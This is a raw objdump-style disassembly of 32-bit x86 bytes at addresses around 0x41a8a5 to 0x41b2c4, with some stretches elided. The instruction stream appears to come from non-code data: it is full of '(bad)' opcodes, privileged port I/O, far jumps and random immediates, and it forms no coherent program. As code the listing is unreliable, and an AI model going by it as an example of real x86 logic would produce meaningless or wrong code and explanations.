  41a8a5:	cmc    
  41a8a6:	les    eax,FWORD PTR [ecx+0x4660ee6b]
  41a8ac:	out    0xc0,al
  41a8ae:	adc    DWORD PTR [edi],ebp
  41a8b0:	pop    ecx
  41a8b1:	retf   0x5130
  41a8b4:	add    ch,BYTE PTR [edi+0xd]
  41a8b7:	adc    DWORD PTR [ebp+0x6ddbd3ce],ebp
  41a8bd:	ja     0x41a86e
  41a8bf:	addr16 inc eax
  41a8c1:	lds    esi,FWORD PTR es:[ebp-0x326ab5c2]
  41a8c8:	add    eax,0x6378f673
  41a8cd:	xor    cl,dh
  41a8cf:	lahf   
  41a8d0:	xor    dh,ah
  41a8d2:	ror    DWORD PTR [ecx+ebp*1-0x28],1
  41a8d6:	in     eax,dx
  41a8d7:	push   0x7b4e7dd3
  41a8dc:	cmp    DWORD PTR [ecx],0xca6a0d6e
  41a8e2:	cmc    
  41a8e3:	loopne 0x41a961
  41a8e5:	in     al,dx
  41a8e6:	leave  
  41a8e7:	imul   esp,DWORD PTR [ecx+0x34],0xed3a1d76
  41a8ee:	push   ebp
  41a8ef:	mov    bh,BYTE PTR [edx+0x67]
  41a8f2:	rcr    DWORD PTR [eax],0x98
  41a8f5:	inc    esi
  41a8f6:	sbb    eax,0x2f3373fd
  41a8fb:	jae    0x41a959
  41a8fd:	or     eax,DWORD PTR [eax]
  41a8ff:	cmp    al,0xdb
  41a901:	loopne 0x41a8b0
  41a903:	pop    ss
  41a904:	inc    ecx
  41a905:	xchg   edi,eax
  41a906:	test   ch,cl
  41a908:	scas   al,BYTE PTR es:[edi]
  41a909:	sbb    al,0x7a
  41a90b:	jnp    0x41a96d
  41a90d:	sbb    cl,al
  41a90f:	adc    BYTE PTR [edi-0x2465e228],cl
  41a915:	and    bh,BYTE PTR [ecx]
  41a917:	fst    DWORD PTR [edx+0x26e88039]
  41a91d:	test   edi,edx
  41a91f:	push   ds
  41a920:	or     DWORD PTR [esi+0x7d81c65f],ebx
  41a926:	std    
  41a927:	push   ecx
  41a928:	sub    al,dh
  41a92a:	das    
  41a92b:	xchg   esp,eax
  41a92c:	sub    ebp,DWORD PTR [ebx+ebx*8+0x2b8aa0e3]
  41a933:	xor    al,BYTE PTR [edx]
  41a935:	shr    DWORD PTR [ecx+0x4fc73a9f],1
  41a93b:	stos   BYTE PTR es:[edi],al
  41a93c:	pusha  
  41a93d:	icebp  
  41a93e:	xchg   edi,eax
  41a93f:	lods   eax,DWORD PTR ds:[esi]
  41a940:	push   ds
  41a941:	xchg   ebx,eax
	...
  41a9b2:	add    BYTE PTR [eax],al
  41a9b4:	xor    esi,DWORD PTR [ecx]
  41a9b6:	xchg   ebx,eax
  41a9b7:	lds    edx,FWORD PTR [ebx-0x46088819]
  41a9bd:	icebp  
  41a9be:	cmp    eax,0x6fdb189e
  41a9c3:	outs   dx,BYTE PTR ds:[esi]
  41a9c4:	sub    ah,BYTE PTR [eax]
  41a9c6:	add    DWORD PTR [eax],eax
  41a9c8:	test   BYTE PTR [eax],0x0
  41a9cb:	add    cl,dh
  41a9cd:	mov    ah,0x59
  41a9cf:	addr16 push ecx
  41a9d1:	and    eax,0x826028eb
  41a9d6:	loop   0x41a9a1
  41a9d8:	xchg   edi,eax
  41a9d9:	mov    dh,0x8b
  41a9db:	and    BYTE PTR [ebx],0xd6
  41a9de:	xor    bl,cl
  41a9e0:	mov    ah,0x6c
  41a9e2:	pop    es
  41a9e3:	fs mov esi,0xe23c7c1f
  41a9e9:	fild   QWORD PTR [edi+0x1f]
  41a9ec:	xchg   edx,edx
  41a9ee:	pusha  
  41a9ef:	xor    eax,0x68c6cf38
  41a9f4:	mov    ecx,0xb7dabb51
  41a9f9:	pop    eax
  41a9fa:	iret   
  41a9fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9fc:	adc    esi,DWORD PTR [ecx-0x249e7846]
  41aa02:	int    0xe3
  41aa04:	push   ecx
  41aa05:	or     DWORD PTR [edi],ebx
  41aa07:	loopne 0x41aa3a
  41aa09:	shr    BYTE PTR [ecx+0x5c],1
  41aa0c:	out    0x83,al
  41aa0e:	fs cwde 
  41aa10:	jmp    0xf1d1c389
  41aa15:	popf   
  41aa16:	mov    cl,0xec
  41aa18:	or     ecx,DWORD PTR [edx]
  41aa1a:	test   DWORD PTR [esi],esi
  41aa1c:	js     0x41a9da
  41aa1e:	in     al,dx
  41aa1f:	xchg   esp,eax
  41aa20:	mov    al,ds:0x8058b129
  41aa25:	int3   
  41aa26:	popf   
  41aa27:	(bad)  
  41aa28:	rcr    DWORD PTR [esi],1
  41aa2a:	frstor [edx-0x11]
  41aa2d:	add    eax,0xc1f9502a
  41aa32:	cmp    BYTE PTR [esi+eax*4],al
  41aa35:	push   edi
  41aa36:	fstp   QWORD PTR [ecx]
  41aa38:	jnp    0x41aa45
  41aa3a:	sub    DWORD PTR [ebx-0x9],esi
  41aa3d:	(bad)  
  41aa3e:	outs   dx,BYTE PTR ds:[esi]
  41aa3f:	or     eax,DWORD PTR [edi+0x64c0b8ba]
  41aa45:	xchg   DWORD PTR [esi+ebp*1+0x3d794872],eax
  41aa4c:	mov    edx,0x6ef46eda
  41aa51:	inc    eax
  41aa52:	pop    edx
  41aa53:	or     DWORD PTR [ebx],0xdea4a293
  41aa59:	push   0x6a
  41aa5b:	(bad)  
  41aa5c:	mov    ?,ecx
  41aa5e:	ss push esi
  41aa60:	adc    BYTE PTR [esi],ah
  41aa62:	push   ebx
  41aa63:	ss sbb esi,ebx
  41aa66:	(bad)  
  41aa67:	jecxz  0x41aaa7
  41aa69:	pop    ebp
  41aa6a:	push   eax
  41aa6b:	mul    cl
  41aa6d:	in     eax,0x32
  41aa6f:	inc    edx
  41aa70:	inc    ecx
  41aa71:	dec    esp
  41aa72:	in     eax,0x80
  41aa74:	sbb    al,0x34
  41aa76:	fisttp QWORD PTR [eax]
  41aa78:	mul    BYTE PTR [ebx-0x45]
  41aa7b:	jbe    0x41aa62
  41aa7d:	push   ecx
  41aa7e:	and    al,0xbe
  41aa80:	xchg   edi,eax
  41aa81:	sub    ebp,DWORD PTR [ebp+0x21]
  41aa84:	cmp    dl,dh
  41aa86:	jmp    0xe5e5:0xcf3b2f23
  41aa8d:	pop    ss
  41aa8e:	sbb    ebx,DWORD PTR ds:0xc6f20370
  41aa94:	adc    BYTE PTR [ecx+0x6a],0x8b
  41aa98:	lahf   
  41aa99:	sti    
  41aa9a:	or     eax,0x3d662979
  41aa9f:	mov    WORD PTR [ebp+0x0],ss
  41aaa2:	push   eax
  41aaa3:	ins    BYTE PTR es:[edi],dx
  41aaa4:	ds mov dl,0xd1
  41aaa7:	push   cs
  41aaa8:	or     eax,0x3ec1d646
  41aaad:	or     ecx,edx
  41aaaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aab0:	ja     0x41aa80
  41aab2:	cmp    al,0xbd
  41aab4:	sub    ecx,esp
  41aab6:	in     al,0xae
  41aab8:	push   edi
  41aab9:	mov    ch,0x35
  41aabb:	pushf  
  41aabc:	xchg   edx,eax
  41aabd:	push   ebx
  41aabe:	sar    DWORD PTR [eax+edi*4],0x70
	...
  41ab32:	add    BYTE PTR [eax],al
  41ab34:	dec    edx
  41ab35:	(bad)  
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi-0x42]
  41ab41:	inc    ebp
  41ab42:	aaa    
  41ab43:	jg     0x41ab65
  41ab45:	and    DWORD PTR [ecx],eax
  41ab47:	add    dh,dh
  41ab49:	add    BYTE PTR [eax],al
  41ab4b:	add    ch,bl
  41ab4d:	(bad)  
  41ab4e:	aam    0xaa
  41ab50:	push   edx
  41ab51:	fcmovu st,st(6)
  41ab53:	mov    ebx,0x56ae4ea8
  41ab58:	addr16 jmp 0x41abb7
  41ab5b:	push   ss
  41ab5c:	inc    ebx
  41ab5d:	stos   DWORD PTR es:[edi],eax
  41ab5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab5f:	add    BYTE PTR [ebx],dh
  41ab61:	mov    ds:0x5baaa0ca,al
  41ab66:	repnz xchg ecx,eax
  41ab68:	mov    dh,0x8b
  41ab6a:	pop    esp
  41ab6b:	or     al,0xd0
  41ab6d:	adc    DWORD PTR [esi+0x28],ecx
  41ab70:	sbb    bh,bh
  41ab72:	and    BYTE PTR [eax-0x338a818],bl
  41ab78:	push   edi
  41ab79:	imul   edx,DWORD PTR [esi-0x25ff653d],0xffffffdc
  41ab80:	inc    esi
  41ab81:	popa   
  41ab82:	or     ebx,DWORD PTR ds:0x88741642
  41ab88:	push   edi
  41ab89:	outs   dx,BYTE PTR ds:[esi]
  41ab8a:	dec    esi
  41ab8b:	clc    
  41ab8c:	je     0x41ab5c
  41ab8e:	sub    al,0x34
  41ab90:	fcom   DWORD PTR [eax+ebp*1+0x6a]
  41ab94:	imul   ecx,DWORD PTR [eax],0x3c15d5b7
  41ab9a:	sbb    al,0x4e
  41ab9c:	in     eax,dx
  41ab9d:	or     bh,BYTE PTR [ecx+0x3d34ed8c]
  41aba3:	dec    esp
  41aba4:	ss and eax,esp
  41aba7:	cmp    eax,eax
  41aba9:	shl    DWORD PTR [ebx-0x67],0xcf
  41abad:	imul   esp,edx,0xd4ff9e55
  41abb3:	jle    0x41ac06
  41abb5:	in     al,0x30
  41abb7:	dec    edx
  41abb8:	rcl    ah,1
  41abba:	adc    DWORD PTR [ecx-0x694c4dec],eax
  41abc0:	popa   
  41abc1:	xlat   BYTE PTR ds:[ebx]
  41abc2:	cmc    
  41abc3:	call   0x9b64:0x8faad792
  41abca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abcb:	mov    ?,WORD PTR [edi+0x1a]
  41abce:	shl    DWORD PTR [edx],1
  41abd0:	in     al,0x8f
  41abd2:	and    BYTE PTR [ebx+0x1d287334],bl
  41abd8:	jbe    0x41ac04
  41abda:	fidivr DWORD PTR [ecx]
  41abdc:	xchg   edi,eax
  41abdd:	outs   dx,BYTE PTR ds:[esi]
  41abde:	jmp    0x6dde:0xedf021a5
  41abe5:	sub    BYTE PTR [edx+0x65fa51aa],0x67
  41abec:	push   edi
  41abed:	push   es
  41abee:	out    0xbc,eax
  41abf0:	fcmove st,st(5)
  41abf2:	or     ch,BYTE PTR [ebx+0x63]
  41abf5:	sub    ebx,DWORD PTR [eax+0x64c59938]
  41abfb:	int3   
  41abfc:	std    
  41abfd:	jnp    0x41ab9f
  41abff:	pop    ss
  41ac00:	pushf  
  41ac01:	sbb    dl,bh
  41ac03:	xlat   BYTE PTR ds:[ebx]
  41ac04:	stos   BYTE PTR es:[edi],al
  41ac05:	gs pop es
  41ac07:	xchg   ecx,eax
  41ac08:	repz inc esi
  41ac0a:	repnz and ecx,DWORD PTR [edi+0x59fe7d77]
  41ac11:	imul   ecx,DWORD PTR [edx-0x295c464b],0xcf19424e
  41ac1b:	ret    
  41ac1c:	imul   esi,edx,0xffffff84
  41ac1f:	cmc    
  41ac20:	xchg   DWORD PTR ds:0x37b00dec,ecx
  41ac26:	cmc    
  41ac27:	push   ebx
  41ac28:	icebp  
  41ac29:	mov    ecx,0x49cdd914
  41ac2e:	test   BYTE PTR [eax+esi*1-0xc60999b],0x88
  41ac36:	out    dx,eax
  41ac37:	xchg   esi,eax
  41ac38:	jbe    0x41ac2f
  41ac3a:	jle    0x41ac10
  41ac3c:	mov    ch,0x75
  41ac3e:	in     al,0xf0
  41ac40:	xchg   esp,eax
  41ac41:	push   0x0
	...
  41acb3:	add    al,dh
  41acb5:	xchg   edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0xdaeb5202
  41acc3:	rcl    DWORD PTR [esi],cl
  41acc5:	and    al,BYTE PTR [ecx]
  41acc7:	add    dh,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    ah,cl
  41accd:	bound  edi,QWORD PTR ds:0x2c79ac2e
  41acd3:	mov    bh,0x69
  41acd5:	retf   
  41acd6:	aam    0x27
  41acd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acd9:	enter  0x59db,0x4a
  41acdd:	xchg   ebx,eax
  41acde:	jne    0x41aced
  41ace0:	shl    BYTE PTR [ebp+0x1f],1
  41ace3:	mov    bl,0xfc
  41ace5:	xor    cl,BYTE PTR [ecx]
  41ace7:	sub    eax,0x1a9ab143
  41acec:	hlt    
  41aced:	mov    BYTE PTR [ebp+0x19],dl
  41acf0:	outs   dx,BYTE PTR ds:[esi]
  41acf1:	mov    dh,0x40
  41acf3:	dec    eax
  41acf4:	ret    0xf899
  41acf7:	sub    al,0x60
  41acf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acfa:	dec    ebp
  41acfb:	ja     0x41ad41
  41acfd:	aaa    
  41acfe:	sbb    ebp,esi
  41ad00:	xchg   BYTE PTR [eax+ebp*8+0x5b56a820],cl
  41ad07:	pop    es
  41ad08:	fdivr  st(4),st
  41ad0a:	sbb    al,0x34
  41ad0c:	fadd   QWORD PTR [edi+edi*4]
  41ad0f:	jge    0x41acfd
  41ad11:	and    BYTE PTR [ebx],al
  41ad13:	cmp    cl,dl
  41ad15:	dec    eax
  41ad16:	jge    0x41ad4b
  41ad18:	mov    esp,0xc08b7648
  41ad1d:	jae    0x41ad4f
  41ad1f:	sub    BYTE PTR [ebx-0x51],al
  41ad22:	pop    ds
  41ad23:	inc    ebp
  41ad24:	cld    
  41ad25:	ja     0x41acba
  41ad27:	sbb    ch,BYTE PTR [esi-0x51]
  41ad2a:	test   DWORD PTR ds:0x77b74baf,esi
  41ad30:	jne    0x41acf8
  41ad32:	jp     0x41ad6b
  41ad34:	mov    bh,0x7a
  41ad36:	push   ds
  41ad37:	pusha  
  41ad38:	(bad)
  41ad3c:	xor    eax,0xa261ffe2
  41ad41:	sbb    al,0x33
  41ad43:	push   es
  41ad44:	inc    esp
  41ad45:	mov    edi,0xc90583e
  41ad4a:	(bad)  ds:0x3c666459
  41ad50:	pop    edx
  41ad51:	mov    ss,WORD PTR [ebp-0x3c]
  41ad54:	dec    ebp
  41ad55:	cmp    DWORD PTR [eax+0x7e],ebx
  41ad58:	xchg   ebp,eax
  41ad59:	push   ebp
  41ad5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad5b:	xchg   edx,eax
  41ad5c:	xor    dh,ah
  41ad5e:	mov    bh,0xd0
  41ad60:	ds mov dl,0x34
  41ad63:	xor    esi,edi
  41ad65:	sub    ax,0x4599
  41ad69:	push   esi
  41ad6a:	in     eax,dx
  41ad6b:	pop    ebx
  41ad6c:	dec    esi
  41ad6d:	adc    al,0x4f
  41ad6f:	adc    dl,BYTE PTR [esi]
  41ad71:	cli    
  41ad72:	ss (bad) 
  41ad74:	sub    edx,edx
  41ad76:	pop    esp
  41ad77:	mov    ebx,0x6ba078e0
  41ad7c:	jae    0x41ada9
  41ad7e:	xlat   BYTE PTR ds:[ebx]
  41ad7f:	into   
  41ad80:	dec    esp
  41ad81:	pop    ds
  41ad82:	adc    al,0x52
  41ad84:	or     eax,0xb81cc7e1
  41ad89:	sub    ah,BYTE PTR [ebp-0x10e82bf4]
  41ad8f:	xchg   ecx,ebx
  41ad91:	add    BYTE PTR [esi],ch
  41ad93:	loop   0x41ad48
  41ad95:	dec    eax
  41ad96:	dec    ebx
  41ad97:	and    BYTE PTR fs:[ecx-0x69],bl
  41ad9b:	std    
  41ad9c:	rcl    DWORD PTR [edi-0x42fcf454],1
  41ada2:	cmp    al,0x97
  41ada4:	(bad)  
  41ada5:	push   eax
  41ada6:	js     0x41ad6b
  41ada8:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41adaa:	imul   ebp,DWORD PTR [eax+eiz*2],0x86e766af
  41adb1:	ret    0xa091
  41adb4:	outs   dx,BYTE PTR ds:[esi]
  41adb5:	sub    ebx,DWORD PTR [edx+0x2d8e7431]
  41adbb:	cmp    bl,dl
  41adbd:	inc    ebx
  41adbe:	ficomp WORD PTR [esi+0x9948]
	...
  41ae34:	xchg   eax,ebx
  41ae36:	pop    ss
  41ae37:	lds    ebx,FWORD PTR [edi-0x31]
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi+0x3077741d]
  41ae41:	jecxz  0x41ae32
  41ae43:	xchg   esp,eax
  41ae44:	or     al,0x23
  41ae46:	add    DWORD PTR [eax],eax
  41ae48:	test   BYTE PTR [eax],0x0
  41ae4b:	add    dl,ah
  41ae4d:	icebp  
  41ae4e:	cmp    ah,BYTE PTR [eax+0x7c6c4079]
  41ae54:	out    dx,eax
  41ae55:	test   BYTE PTR [esi-0x3c],bl
  41ae58:	xchg   esi,eax
  41ae59:	mov    edx,0xb6f5c608
  41ae5e:	sti    
  41ae5f:	(bad)
  41ae63:	mov    esi,0xb0d88092
  41ae68:	or     al,BYTE PTR [ebx+0x6b249953]
  41ae6e:	repz aaa 
  41ae70:	push   eax
  41ae71:	dec    edx
  41ae72:	dec    ebp
  41ae73:	loop   0x41ae12
  41ae75:	in     eax,dx
  41ae76:	adc    edi,ecx
  41ae78:	arpl   dx,si
  41ae7a:	sti    
  41ae7b:	fadd   QWORD PTR [ebp-0x3a02896b]
  41ae81:	outs   dx,BYTE PTR ds:[esi]
  41ae82:	(bad)  
  41ae83:	or     ch,BYTE PTR [esp+edi*8+0x66ae7eec]
  41ae8a:	leave  
  41ae8b:	dec    ebp
  41ae8c:	mov    edx,DWORD PTR [eax+0x43]
  41ae8f:	or     eax,0x7b8c3e0a
  41ae94:	shl    BYTE PTR [ebx+0x1],0xaa
  41ae98:	fistp  WORD PTR [ebx+0x31733b7d]
  41ae9e:	xchg   ecx,eax
  41ae9f:	div    DWORD PTR [edi+0xe]
  41aea2:	leave  
  41aea3:	cli    
  41aea4:	push   0x6a152718
  41aea9:	push   ebx
  41aeaa:	je     0x41ae57
  41aeac:	cmp    BYTE PTR [ecx-0x458f6ece],cl
  41aeb2:	mov    eax,ds:0x22a65015
  41aeb7:	fsubr  DWORD PTR [edi+0x57]
  41aeba:	fsubr  st,st(6)
  41aebc:	pop    ss
  41aebd:	pop    ecx
  41aebe:	fld    QWORD PTR [eax-0x5c]
  41aec1:	sti    
  41aec2:	and    eax,0xff9d7a3f
  41aec7:	or     al,0xee
  41aec9:	push   eax
  41aeca:	cmp    al,0x1c
  41aecc:	mov    ch,0x7f
  41aece:	push   edx
  41aecf:	sub    BYTE PTR [eax],al
  41aed1:	in     al,dx
  41aed2:	into   
  41aed3:	jne    0x41ae78
  41aed5:	mov    ebp,0x5773edf2
  41aeda:	mov    ecx,0x9e2481b9
  41aedf:	mov    ds:0xe97a2f05,al
  41aee4:	aad    0x4f
  41aee6:	(bad)  
  41aee7:	ds jmp 0x3deaacd1
  41aeed:	stos   DWORD PTR es:[edi],eax
  41aeee:	xchg   BYTE PTR [edx],bl
  41aef0:	enter  0xc6c3,0xae
  41aef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aef5:	test   eax,0x5d9c38ec
  41aefa:	xchg   edx,eax
  41aefb:	nop
  41aefc:	stos   DWORD PTR es:[edi],eax
  41aefd:	push   eax
  41aefe:	pushf  
  41aeff:	pop    edi
  41af00:	repz push ebx
  41af02:	pop    esp
  41af03:	cdq    
  41af04:	pop    esi
  41af05:	mov    ds:0x186cc2e0,al
  41af0a:	push   esp
  41af0b:	add    edx,DWORD PTR [eax]
  41af0d:	xor    eax,0x866710c1
  41af12:	adc    BYTE PTR [ecx-0xf],dl
  41af15:	cmp    DWORD PTR [ecx+0x174f7607],esi
  41af1b:	dec    ebp
  41af1c:	pop    esi
  41af1d:	pop    ebx
  41af1e:	push   ds
  41af1f:	jb     0x41af4e
  41af21:	xor    edi,ecx
  41af23:	cmp    BYTE PTR [esp+ecx*2+0x26f9375f],al
  41af2a:	pop    esi
  41af2b:	and    ecx,DWORD PTR [ebx]
  41af2d:	out    dx,al
  41af2e:	fld    TBYTE PTR [ebx-0x7b]
  41af31:	ins    DWORD PTR es:[edi],dx
  41af32:	and    BYTE PTR [ecx],ah
  41af34:	sbb    al,0x1c
  41af36:	(bad)
  41af3a:	inc    ebp
  41af3b:	cmp    bl,0xc7
  41af3e:	inc    DWORD PTR [eax+0x36f4]
	...
  41afb4:	dec    esi
  41afb5:	jmp    0x41afe1
  41afb7:	dec    esi
  41afb8:	scas   eax,DWORD PTR es:[edi]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0xdb
  41afc1:	mov    cl,0x46
  41afc3:	scas   al,BYTE PTR es:[edi]
  41afc4:	add    ah,BYTE PTR [ecx+eax*1]
  41afc7:	add    dh,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    cl,ah
  41afcd:	sub    dl,dl
  41afcf:	push   edi
  41afd0:	imul   ebp,DWORD PTR [ecx-0x7d],0xeab827fc
  41afd7:	xor    cl,bh
  41afd9:	xchg   ebx,eax
  41afda:	jmp    0x41afe5
  41afdc:	dec    DWORD PTR [eax+0x3ab33b66]
  41afe2:	fdivr  QWORD PTR [edi+0x707c1e1c]
  41afe8:	mov    bl,0x5b
  41afea:	cmp    al,0xd1
  41afec:	popa   
  41afed:	mov    ds:0xb4882b05,al
  41aff2:	or     al,0xe3
  41aff4:	jge    0x41af7f
  41aff6:	cli    
  41aff7:	outs   dx,DWORD PTR ds:[esi]
  41aff8:	in     al,0xf5
  41affa:	cli    
  41affb:	in     eax,dx
  41affc:	fcmovnb st,st(1)
  41affe:	adc    esi,ebx
  41b000:	js     0x41b05b
  41b002:	test   BYTE PTR [esi-0x5b],ch
  41b005:	sbb    bh,ah
  41b007:	jb     0x41b082
  41b009:	in     al,0x21
  41b00b:	mov    eax,0x62aa7fad
  41b010:	xchg   ebp,eax
  41b011:	push   edx
  41b012:	mov    ds:0xcf4975d2,al
  41b017:	ins    BYTE PTR es:[edi],dx
  41b018:	mov    ds:0x6903350e,al
  41b01d:	nop
  41b01e:	adc    al,BYTE PTR [edx]
  41b020:	cs js  0x41b01b
  41b023:	data16 cmp al,0x1e
  41b026:	inc    eax
  41b027:	dec    bp
  41b029:	and    dh,BYTE PTR [edx]
  41b02b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b02c:	mov    ds:0xdc81f1cd,eax
  41b031:	aam    0x25
  41b033:	mov    esi,0x5c1687d4
  41b038:	neg    DWORD PTR [eax]
  41b03a:	sbb    BYTE PTR [ecx+0x30b5c60a],0x4c
  41b041:	or     edx,DWORD PTR [esi+0xa3acfa9]
  41b047:	cmp    eax,0xfb1c0726
  41b04c:	adc    esp,ebp
  41b04e:	mov    ss,WORD PTR [edi]
  41b050:	jo     0x41afed
  41b052:	nop
  41b053:	in     al,dx
  41b054:	mov    cl,0x68
  41b056:	push   ebp
  41b057:	sar    eax,0x5e
  41b05a:	ret    
  41b05b:	jp     0x41b0af
  41b05d:	cmp    ecx,esi
  41b05f:	xchg   ebx,eax
  41b060:	pop    ecx
  41b061:	enter  0xcde7,0xfb
  41b065:	sbb    cl,BYTE PTR [ebp+0x1a]
  41b068:	xchg   esi,eax
  41b069:	lods   eax,DWORD PTR ds:[esi]
  41b06a:	jmp    0x41afff
  41b06c:	rcl    DWORD PTR [edi],1
  41b06e:	fs dec edi
  41b070:	xchg   DWORD PTR [ebx-0x24f1648c],ebp
  41b076:	rcr    bl,cl
  41b078:	xchg   ebp,eax
  41b079:	sahf   
  41b07a:	leave  
  41b07b:	push   edi
  41b07c:	aas    
  41b07d:	mov    edx,0x451809f1
  41b082:	ret    0x8f27
  41b085:	inc    eax
  41b086:	jno    0x41b01e
  41b088:	data16 loopne 0x41b03c
  41b08b:	das    
  41b08c:	xchg   BYTE PTR [esi+0x47],dh
  41b08f:	aam    0x81
  41b091:	cmovno ebx,edx
  41b094:	int    0x7b
  41b096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b097:	mov    ecx,0xac095620
  41b09c:	aad    0xc3
  41b09e:	jno    0x41b0c8
  41b0a0:	scas   eax,DWORD PTR es:[edi]
  41b0a1:	or     DWORD PTR [edx+esi*2-0x23],0xfe08142
  41b0a9:	pop    DWORD PTR [ecx]
  41b0ab:	sti    
  41b0ac:	add    al,0x68
  41b0ae:	push   ds
  41b0af:	sbb    ebx,esp
  41b0b1:	repz es jge 0x41b0ea
  41b0b5:	xchg   edx,eax
  41b0b6:	or     cl,dl
  41b0b8:	mov    al,0x44
  41b0ba:	ror    dh,cl
  41b0bc:	cmp    edi,DWORD PTR [eax-0x2c5f3d56]
	...
  41b132:	add    BYTE PTR [eax],al
  41b134:	sbb    al,0xc
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	(bad)  
  41b141:	data16 (bad) [ecx+0x124f8]
  41b148:	test   BYTE PTR [eax],0x0
  41b14b:	add    BYTE PTR [edi],dl
  41b14d:	cli    
  41b14e:	inc    bh
  41b150:	xchg   esi,eax
  41b151:	or     ah,BYTE PTR [eax-0x51b1d3e3]
  41b157:	push   ss
  41b158:	ins    DWORD PTR es:[edi],dx
  41b159:	es dec ebx
  41b15b:	lods   eax,DWORD PTR ds:[esi]
  41b15c:	imul   ecx,DWORD PTR [eax],0xfffffff3
  41b15f:	mul    DWORD PTR [ecx-0x5c]
  41b162:	(bad)  
  41b163:	mov    esi,0xec6f9342
  41b168:	mov    bl,0xe3
  41b16a:	xor    DWORD PTR [eax+0x59],esi
  41b16d:	mov    ebp,cs
  41b16f:	mov    bl,0x66
  41b171:	dec    ebx
  41b172:	call   0x91fb015c
  41b177:	mov    eax,0xc95de698
  41b17c:	fbstp  TBYTE PTR [esp+edx*2]
  41b17f:	pop    esp
  41b180:	mov    ch,0x10
  41b182:	xchg   ecx,eax
  41b183:	push   0xffffff92
  41b185:	or     BYTE PTR [ecx],dh
  41b187:	xor    al,0xe9
  41b189:	nop
  41b18a:	arpl   di,bx
  41b18c:	shl    DWORD PTR [ecx-0x4f],1
  41b18f:	test   al,0x81
  41b191:	pushf  
  41b192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b193:	adc    DWORD PTR [edi+0x1d],edi
  41b196:	aas    
  41b197:	pop    ds
  41b198:	aas    
  41b199:	test   al,0x7d
  41b19b:	cmp    esi,DWORD PTR [bx+si-0x178e]
  41b1a0:	dec    esp
  41b1a1:	cmp    DWORD PTR [edx],edi
  41b1a3:	push   ebp
  41b1a4:	popa   
  41b1a5:	shr    BYTE PTR ds:0xb734cd04,1
  41b1ab:	and    BYTE PTR [esi-0x35],ch
  41b1ae:	and    al,0xf6
  41b1b0:	stos   BYTE PTR es:[edi],al
  41b1b1:	adc    al,0x1c
  41b1b3:	int    0xd5
  41b1b5:	jecxz  0x41b1ff
  41b1b7:	jns    0x41b190
  41b1b9:	sub    eax,0xf2a515c7
  41b1be:	pop    edx
  41b1bf:	fidivr WORD PTR [eiz*2-0x2d9fa476]
  41b1c6:	inc    DWORD PTR [eax+0x6c]
  41b1c9:	push   eax
  41b1ca:	inc    ecx
  41b1cb:	adc    al,0xb1
  41b1cd:	retf   0x7d40
  41b1d0:	sbb    BYTE PTR [ebx],dl
  41b1d2:	xchg   edx,eax
  41b1d3:	in     al,dx
  41b1d4:	add    eax,0x9b19bd52
  41b1d9:	ficom  WORD PTR [eax]
  41b1db:	test   eax,0xb121e94e
  41b1e0:	loope  0x41b217
  41b1e2:	cs scas al,BYTE PTR es:[edi]
  41b1e4:	sub    dh,al
  41b1e6:	sub    al,0x3b
  41b1e8:	cdq    
  41b1e9:	jcxz   0x41b203
  41b1ec:	dec    esi
  41b1ed:	(bad)  
  41b1ee:	and    ch,BYTE PTR [edx+0xf]
  41b1f1:	inc    edx
  41b1f2:	adc    eax,0x10854012
  41b1f7:	cmp    cl,bh
  41b1f9:	or     BYTE PTR [esi],ch
  41b1fb:	adc    BYTE PTR [esi],ah
  41b1fd:	test   al,0x66
  41b1ff:	cmp    BYTE PTR [esi+0x375bd0ce],0x6b
  41b206:	rcr    BYTE PTR [esi+0x3739fa2],cl
  41b20c:	fcomp  DWORD PTR [eax]
  41b20e:	xor    DWORD PTR [ecx-0x22cebd2a],esi
  41b214:	gs or  ebp,edx
  41b217:	(bad)  
  41b21a:	retf   
  41b21b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b21c:	leave  
  41b21d:	push   eax
  41b21e:	xchg   edi,eax
  41b21f:	lahf   
  41b220:	or     eax,eax
  41b222:	je     0x41b1d0
  41b224:	ret    0x8a9a
  41b227:	push   0xffffffcb
  41b229:	pop    ebp
  41b22a:	lods   eax,DWORD PTR ds:[esi]
  41b22b:	xor    al,0x26
  41b22d:	les    eax,FWORD PTR [edx-0x15]
  41b230:	jne    0x41b249
  41b232:	adc    DWORD PTR [ebx+0x3b4c44f8],esp
  41b238:	mov    eax,0xc18d52ca
  41b23d:	fiadd  DWORD PTR [ebp+0xf]
  41b240:	push   edi
  41b241:	sbb    eax,0x0
	...
  41b2b2:	add    BYTE PTR [eax],al
  41b2b4:	neg    DWORD PTR [eax-0x58]
  41b2b7:	adc    ebp,DWORD PTR [edi+0x3afcfff3]
  41b2bd:	out    dx,eax
  41b2be:	jl     0x41b2c7
  41b2c0:	or     BYTE PTR [edx+0x72],bh
  41b2c3:	cwde   
  41b2c4:	out    dx,al
